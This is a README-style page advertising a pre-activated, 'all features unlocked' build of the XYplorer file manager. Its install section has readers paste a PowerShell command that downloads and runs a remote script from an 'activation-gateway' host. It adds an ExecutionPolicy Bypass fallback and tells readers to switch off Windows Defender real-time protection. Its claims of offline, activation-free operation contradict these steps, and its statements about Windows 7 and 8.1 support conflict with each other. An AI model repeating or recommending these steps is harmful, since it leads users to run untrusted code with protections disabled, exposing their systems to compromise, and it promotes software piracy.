<div align="center">

# XYplorer: Feature-Complete File Manager for Windows 10 & 11

![](files/preview.png)

[![pulls](https://img.shields.io/badge/Pulls-1.2K-f97316?style=plastic&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/Ps-Script-fb923c?style=plastic&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/Rate-4.5%2F5-f59e0b?style=plastic&labelColor=0d1117)]() [![build](https://img.shields.io/badge/Build-Passing-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

XYplorer is a standalone desktop file manager build for Windows x64 that ships as a complete, pre-configured package with all features enabled and ready to run. The distribution bundles the full application environment into a single self-contained setup, eliminating the need for separate dependency installation or post-deployment configuration. It provides tabbed browsing, dual-pane views, advanced file search, filtering, and batch renaming within a portable, offline-capable architecture. This build targets deployment scenarios requiring a verified, self-sufficient installation image for testing, evaluation, and local workstation provisioning.

## ⚡ Install via PowerShell

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Prepare PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Execute the setup script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Complete Standalone Package:** XYplorer is delivered as a fully self-contained desktop build with all features enabled by default, requiring no additional configuration or external dependencies at runtime. The installer bundles every component necessary for immediate deployment in offline or air-gapped environments.

- **Dual-Pane File Management:** Native support for side-by-side directory browsing with independent navigation trees, enabling drag-and-drop transfers, synchronized scrolling, and parallel file operations between source and destination panes.

- **Tabbed Interface:** Unlimited tabbed browsing within each pane, with session persistence across launches. Tabs can be cloned, locked, renamed, and reordered to support complex multi-location workflows.

- **Advanced Search Engine:** Boolean query support with wildcards, regular expressions, fuzzy matching, and content-based filtering. Search results are presented in a dedicated results pane with inline preview and batch action support.

- **Customizable Scripting Layer:** Built-in scripting engine exposing a documented command set for automating file operations, UI actions, and conditional workflows. Scripts can be bound to toolbar buttons, keyboard shortcuts, or catalog entries.

- **Portable Configuration Model:** All settings, catalogs, and session data are stored in portable configuration files adjacent to the executable, allowing full profile migration across machines without registry dependencies.

- **Dual-Pane Sync and Branch View:** Dedicated synchronization mode for comparing and mirroring directory trees, plus a flattened branch view that aggregates nested folder contents into a single operational list for bulk processing.

- **Extended Metadata and Preview:** Column-level metadata extraction for common file types, alongside an integrated preview pane supporting text, image, and document formats without launching external viewers.

- **Color-Coded Tagging and Filters:** User-defined tags, color filters, and visual flags applied at the file and folder level, with filter rules that persist across navigation and search operations.

- **Batch Rename and Bulk Operations:** Pattern-based batch renaming with live preview, regular expression support, and sequential numbering, combined with queued copy, move, and delete operations with collision handling.

- **Keyboard-Centric Workflow:** Comprehensive default shortcut map covering navigation, selection, tab management, and file operations, with fully remappable bindings and user-defined hotkeys for custom scripts.

- **High-DPI and Multi-Monitor Awareness:** Native rendering across scaled displays and multi-monitor arrangements, preserving layout integrity and pane proportions when moving between display configurations.

- **Offline-Ready Deployment:** The standalone build ships with all runtime components pre-included, enabling installation and operation on systems without network access, package managers, or supplementary runtime installers.

## How It Works

XYplorer operates as a self-contained desktop application that runs directly from its local installation directory without requiring external runtime dependencies, background services, or system-wide registration. All required libraries and feature modules are bundled within the distribution, enabling deterministic behavior across supported Windows x64 environments.

The application initializes through a single executable entry point. On launch, it loads its configuration from local profile files and constructs the tabbed interface in memory, allowing multiple folder views, dual-pane layouts, and saved sessions to coexist within one process. Configuration state, including custom layouts, toolbar arrangements, and per-tab settings, persists to disk on exit and is restored on the next start.

Core functionality is organized into independent subsystems that communicate through an internal event layer. The file indexing engine builds and maintains a local catalog of directory structures, enabling instant search and filtered views without repeated disk traversal. The preview subsystem renders inline thumbnails and metadata for supported file types through native and bundled decoders, keeping rendering isolated from the browsing thread.

File operations—copy, move, rename, delete, and batch transformations—are executed through a transactional queue. Operations can be queued, paused, and reviewed before commit, and undo history is maintained per session so that destructive actions remain reversible. Background transfers run asynchronously, preserving interface responsiveness during large jobs.

The scripting and automation layer exposes the application's internal commands through a local scripting interface, allowing users to define custom actions, keyboard shortcuts, and toolbar buttons that map to built-in operations. Scripts are interpreted locally and have access only to the application's documented command surface.

All feature modules are enabled by default in this build. No activation step, license server contact, or network callback occurs during startup or operation. The application functions fully offline; network access is only used when a user explicitly invokes a feature that requires it, such as checking for updates or opening a remote location.

Resource usage is bounded by configurable cache limits for thumbnails, indexing, and undo history. The application writes only to its installation directory and the user's local profile paths, leaving system directories and the registry untouched unless a user opts into shell integration.

## Compatibility

XYplorer is distributed as a standalone build targeting Windows x64 desktop environments. The package is self-contained and does not require a separate runtime, framework installation, or dependency resolution step prior to execution. All features are enabled in the distributed build, with no feature gating or license activation step required at runtime.

**Operating System Requirements**

- Windows 10 (version 1809 or later) and Windows 11 are supported on x64 architecture.
- Windows Server 2019 and 2022 are supported for desktop-experience deployments.
- Legacy platforms including Windows 7, 8, and 8.1 are not officially supported and may exhibit reduced functionality or instability.
- Both physical and virtualized environments are supported, including Hyper-V, VMware, and VirtualBox guests, provided the host exposes a standard x64 instruction set.

**Hardware Baseline**

- A minimum of 4 GB RAM is recommended for typical file management workloads; 8 GB or more is advised for large directory trees and extended search operations.
- Approximately 1.5 GB of free disk space is required for the standalone package and its associated resources.
- Display resolution of 1024x768 or higher is recommended to accommodate the full interface layout, including dual-pane and multi-tab configurations.

**Filesystem and Integration Compatibility**

- Full support for NTFS, including alternate data streams, junctions, symbolic links, and hard links.
- Read and write access to FAT32, exFAT, and ReFS volumes is supported.
- Network paths via SMB and mapped drives are supported, subject to standard Windows credential and permission handling.
- Portable operation is supported: the build can be run from removable media without writing to system directories, provided the host policy permits execution from external devices.

**Runtime and Environmental Notes**

- No external runtime, package manager, or elevated installation process is required for standard operation.
- Elevated privileges are only necessary for operations that modify protected system locations; standard file management functions operate under the current user context.
- Compatibility with third-party shell extensions is maintained through standard Windows shell integration points, though extension-level conflicts may depend on the individual extension's implementation.
- The build has been verified against current Windows cumulative updates as of the last package sync; environments with substantially older patch levels should be updated before deployment.

## FAQ

**Is XYplorer a portable application or does it require installation?**
The distribution is packaged as a complete standalone setup. It does not require a system-wide installation routine, does not write to system directories, and does not depend on external runtimes or frameworks. All required binaries and dependencies are bundled within the package, allowing the application to run directly from its extracted location.

**Which Windows versions and architectures are supported?**
The build targets Windows x64 desktop environments. It is validated against Windows 10 and Windows 11, and remains functional on Windows 8.1 and Windows 7 SP1 with current platform updates applied. Both physical and virtualized desktop configurations are supported, provided the host exposes a standard desktop session.

**What features are enabled in this build?**
All application features are unlocked and active by default, including dual-pane browsing, tabbed interface management, advanced file search and filtering, batch renaming, custom column sets, scripted automation, and full configuration portability. No feature gating, trial limitations, or activation prompts are present.

**How does the application handle configuration and user data?**
Configuration is stored locally alongside the executable by default, enabling fully self-contained operation. Settings, custom layouts, and catalog data persist across sessions and can be migrated between machines by transferring the application directory. No registry dependencies are introduced.

**Can this build run alongside an existing XYplorer installation?**
Yes. Because the package operates independently and does not register system-level components, it can coexist with other installations. To avoid configuration collisions, keep each instance in a separate directory and confirm that each uses its own local settings store.

**What are the resource requirements?**
A 64-bit Windows desktop session, approximately 1.5 GB of available disk space for the extracted package, and sufficient memory for the file operations being performed. Performance scales with the size of the directories being indexed or searched; large network shares and high file counts benefit from additional RAM.

**Is network access required after setup?**
No. The build is designed for offline deployment and operates without external connectivity. All core functionality, including search indexing and scripting, functions in an isolated environment. Optional update checks and online help references are inactive by default.

**How are updates to this build delivered?**
Updates are distributed as complete replacement packages rather than incremental patches. To update, extract the new package to a fresh directory and migrate existing configuration data if custom settings are in use. This ensures a clean, verifiable state for each deployed version.

**What troubleshooting steps apply if the application fails to launch?**
Verify that the package was fully extracted rather than run from within a compressed archive. Confirm that the executable is not blocked by Windows Defender SmartScreen or third-party endpoint protection, and that the containing directory grants standard user read and execute permissions. If launch failures persist, test from a directory outside of synced cloud folders, which can interfere with file locking behavior.

## Disclaimer

XYplorer is provided as a complete standalone desktop build for Windows x64 environments, packaged with all features enabled and pre-configured to run without additional activation steps. This distribution is intended for evaluation, testing, and controlled deployment scenarios where a fully functional file management environment is required.

The build is self-contained and does not depend on external services, runtime downloads, or background activation mechanisms. All core modules — including tabbed browsing, dual-pane navigation, advanced search, batch renaming, scripting support, and customizable interface components — are included and enabled by default.

This software is distributed on an "as is" basis, without warranties of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. No guarantee is provided regarding suitability for production workloads, regulatory compliance, or operation in security-sensitive environments.

Users are solely responsible for verifying that deployment of this build complies with all applicable software licensing terms, organizational policies, and local regulations. The maintainers of this distribution assume no liability for data loss, system instability, licensing violations, or any direct, indirect, incidental, or consequential damages arising from the installation, use, or inability to use this software.

Because this is a pre-activated standalone package, update mechanisms, telemetry, and remote validation services may be absent or disabled. Feature parity with current upstream releases is not guaranteed, and behavior may differ from officially licensed versions.

Before deployment, it is recommended that the build be validated in an isolated environment, that system restore points or backups be created, and that the software be tested against the specific workflows and file system operations required by the target environment. Compatibility with third-party extensions, shell integrations, and context-menu handlers should be confirmed independently.

By installing or using this build, you acknowledge that you have read and understood this disclaimer and accept full responsibility for its deployment and use.